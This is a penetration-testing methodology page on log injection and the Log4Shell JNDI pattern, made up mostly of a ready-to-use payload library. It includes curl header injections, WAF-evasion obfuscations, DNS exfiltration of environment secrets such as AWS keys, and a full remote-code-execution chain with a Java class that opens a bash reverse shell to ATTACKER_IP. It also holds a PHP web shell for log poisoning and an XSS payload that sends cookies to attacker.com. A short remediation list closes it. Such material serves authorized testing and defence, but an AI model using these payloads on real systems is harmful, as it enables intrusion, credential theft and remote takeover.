---
title: "Log Injection & Log4Shell Pattern"
date: 2026-02-24
draft: false
---

# Log Injection & Log4Shell Pattern

> **Severity**: Critical | **CWE**: CWE-117, CWE-74
> **OWASP**: A03:2021 – Injection | A06:2021 – Vulnerable and Outdated Components

---

## What Is Log Injection / Log4Shell Pattern?

**Log Injection** — embedding control characters or escape sequences in log entries to corrupt log files, inject fake entries, or exploit log viewers.

**Log4Shell pattern** — when a logging library performs **JNDI lookups** on log messages, attacker-controlled strings like `${jndi:ldap://attacker.com/x}` trigger remote code execution. While Log4j2 was the major case, the JNDI injection pattern extends to **any Java logging that interpolates log data**.

```
User-Agent: ${jndi:ldap://attacker.com/exploit}
→ Log4j2 logs this → evaluates ${...} → makes LDAP call → downloads/executes class
```

---

## Discovery Checklist

- [ ] Find all user-controlled inputs that reach log files: User-Agent, Referer, X-Forwarded-For, login username, search queries, form fields
- [ ] Test basic `${jndi:ldap://COLLABORATOR_ID.oast.pro/}` in HTTP headers
- [ ] Test in every header: X-Api-Version, X-Forwarded-Host, X-Custom-IP-Authorization
- [ ] Test in JSON body fields, XML fields, GraphQL query names
- [ ] Test in URL path segments and query parameters
- [ ] Test bypass for WAFs filtering `${jndi:`:
  - `${${lower:j}ndi:...}`
  - `${${upper:j}nd${lower:i}:...}`
  - `${j${::-n}di:...}`
- [ ] Check for Log4j via error messages, HTTP headers (`X-Powered-By`, `Server`)
- [ ] Test LDAP, LDAPS, RMI, DNS, HTTP protocols in JNDI payload
- [ ] Detect via DNS OOB (fastest confirmation — no exploit needed)
- [ ] Test log viewers for stored XSS via newline injection

---

## Payload Library

### Payload 1 — JNDI Detection (DNS OOB — No Exploit)

```bash
# Basic detection — DNS lookup confirms vulnerability:
${jndi:dns://COLLABORATOR_ID.oast.pro}
${jndi:ldap://COLLABORATOR_ID.oast.pro/a}
${jndi:rmi://COLLABORATOR_ID.oast.pro/a}

# In every HTTP header:
curl -s https://target.com/ \
  -H "User-Agent: \${jndi:dns://COLLABORATOR_ID.oast.pro/ua}" \
  -H "X-Forwarded-For: \${jndi:dns://COLLABORATOR_ID.oast.pro/xff}" \
  -H "Referer: \${jndi:dns://COLLABORATOR_ID.oast.pro/ref}" \
  -H "X-Api-Version: \${jndi:dns://COLLABORATOR_ID.oast.pro/api}" \
  -H "Accept-Language: \${jndi:dns://COLLABORATOR_ID.oast.pro/lang}"

# In login form username:
curl -s -X POST https://target.com/login \
  -d "username=\${jndi:dns://COLLABORATOR_ID.oast.pro/user}&password=test"

# In JSON body:
curl -s -X POST https://target.com/api/search \
  -H "Content-Type: application/json" \
  -d '{"query": "${jndi:dns://COLLABORATOR_ID.oast.pro/q}"}'
```

### Payload 2 — JNDI Bypass Techniques (WAF Evasion)

```bash
# Case manipulation with Log4j lookup functions:
${${lower:j}ndi:${lower:l}dap://COLLABORATOR_ID.oast.pro/}
${${upper:j}ndi:${upper:l}dap://COLLABORATOR_ID.oast.pro/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://COLLABORATOR_ID.oast.pro/}

# Nested expressions:
${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//COLLABORATOR_ID.oast.pro/}
${j${::-n}di:ldap://COLLABORATOR_ID.oast.pro/}
${j${lower:n}di:ldap://COLLABORATOR_ID.oast.pro/}
${${lower:jndi}:${lower:ldap}://COLLABORATOR_ID.oast.pro/}

# URL encoding variants:
%24%7bjndi%3aldap%3a%2f%2fCOLLABORATOR_ID.oast.pro%2f%7d
${jndi:ldap://COLLABORATOR_ID.oast.pro%23.target.com/}  # domain confusion

# Colon replacement:
${jndi${:}:ldap${:}//COLLABORATOR_ID.oast.pro/}

# Unicode:
${j\u006edi:\u006cdap://COLLABORATOR_ID.oast.pro/}

# Double encoding:
%2524%257bjndi%253aldap://COLLABORATOR_ID.oast.pro/%257d
```

### Payload 3 — JNDI RCE (Lab/Authorized Testing Only)

```bash
# Requires: JNDI exploit server (marshalsec or JNDI-Exploit-Kit)

# marshalsec setup:
git clone https://github.com/mbechler/marshalsec
cd marshalsec && mvn package -DskipTests

# Start LDAP redirect server pointing to malicious class:
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://ATTACKER_IP:8888/#Exploit"

# Create malicious Java class (Exploit.java):
cat > Exploit.java << 'EOF'
public class Exploit {
  static {
    try {
      Runtime rt = Runtime.getRuntime();
      String[] commands = {"/bin/bash", "-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"};
      Process proc = rt.exec(commands);
      proc.waitFor();
    } catch (Exception e) {}
  }
}
EOF
javac Exploit.java

# Serve the class:
python3 -m http.server 8888

# Start listener:
nc -lvnp 4444

# Trigger the exploit:
curl -s https://target.com/login \
  -H "User-Agent: \${jndi:ldap://ATTACKER_IP:1389/Exploit}"
```

### Payload 4 — Log Injection (Newline Injection)

```bash
# Inject fake log entries via CRLF in logged fields:
# If username is logged as: [INFO] Login attempt by: USERNAME

# Inject fake entry:
username=admin%0a[INFO] Login success for: admin (bypassed)
username=admin%0d%0a[ERROR] Authentication disabled

# Inject into User-Agent for access log poisoning:
curl -s https://target.com/ \
  -H "User-Agent: Mozilla/5.0%0aFAKE_LOG_ENTRY: admin logged in successfully"

# LFI via log poisoning (see 18_FileInclusion.md):
curl -s https://target.com/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# Then LFI: /var/log/apache2/access.log&cmd=id

# Inject into log viewer XSS:
# If log viewer renders HTML:
-H "User-Agent: <script>alert(1)</script>"
-H "User-Agent: <img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"
```

### Payload 5 — Environment Variable Exfil (Log4j)

```bash
# Log4j can expand environment variables:
${env:JAVA_HOME}
${env:AWS_SECRET_ACCESS_KEY}
${env:DATABASE_PASSWORD}
${env:CATALINA_HOME}

# Exfil env variable via DNS:
${jndi:dns://${env:AWS_SECRET_ACCESS_KEY}.COLLABORATOR_ID.oast.pro}
${jndi:ldap://${env:DATABASE_URL}.COLLABORATOR_ID.oast.pro/}

# Get system property:
${sys:java.version}
${sys:user.home}
${sys:os.name}

# Exfil via DNS:
${jndi:dns://${sys:java.version}.COLLABORATOR_ID.oast.pro}
```

---

## Tools

```bash
# interactsh — OOB detection:
interactsh-client -v
# Use generated URL as COLLABORATOR_ID.oast.pro replacement

# log4j-scan — automated header injection scanner:
git clone https://github.com/fullhunt/log4j-scan
python3 log4j-scan.py -u https://target.com/

# Custom header scanner:
headers=(
  "User-Agent"
  "X-Forwarded-For"
  "X-Forwarded-Host"
  "Referer"
  "Origin"
  "Accept-Language"
  "X-Api-Version"
  "X-Real-IP"
  "Authorization"
  "X-Custom-IP-Authorization"
)

COLLAB="COLLABORATOR_ID.oast.pro"
for h in "${headers[@]}"; do
  slug=$(echo "$h" | tr '[:upper:]' '[:lower:]' | tr '-' '_')
  curl -sk "https://target.com/" \
    -H "$h: \${jndi:dns://$slug.$COLLAB/}" &
done
wait

# Check Java version via JNDI (no RCE, just info):
# Response in collaborator tells you Java version from callback

# nuclei log4j templates:
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# BurpSuite:
# - Active Scan checks Log4Shell via all headers
# - Log4Shell Scanner extension (BApp store)
# - Burp Collaborator: use as JNDI callback domain
```

---

## Remediation Reference

- **Log4j**: upgrade to >= 2.17.1 (2.12.4 for Java 8, 2.3.2 for Java 7) — disables JNDI by default
- **Short-term mitigation**: set `-Dlog4j2.formatMsgNoLookups=true` JVM flag or `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` env
- **Remove JndiLookup class**: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- **Network egress control**: block outbound LDAP/RMI/DNS to untrusted destinations
- **Input sanitization for logs**: sanitize before logging — strip `${}`, `%{...}`, newlines from user input
- **Log file permissions**: application user should not be able to read its own access logs
- **Web Application Firewall**: block `${jndi:` patterns in all input vectors (defense in depth, not primary fix)

*Part of the Web Application Penetration Testing Methodology series.*
